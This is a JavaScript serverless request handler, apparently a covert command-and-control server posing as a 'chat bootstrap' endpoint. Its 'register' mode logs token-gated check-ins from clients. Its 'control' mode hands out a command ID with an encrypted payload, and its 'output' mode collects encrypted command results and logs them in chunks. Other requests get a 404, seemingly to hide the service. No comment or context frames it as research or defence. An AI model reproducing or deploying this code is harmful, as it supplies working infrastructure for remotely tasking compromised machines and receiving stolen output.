import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '56';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}

function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}

export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
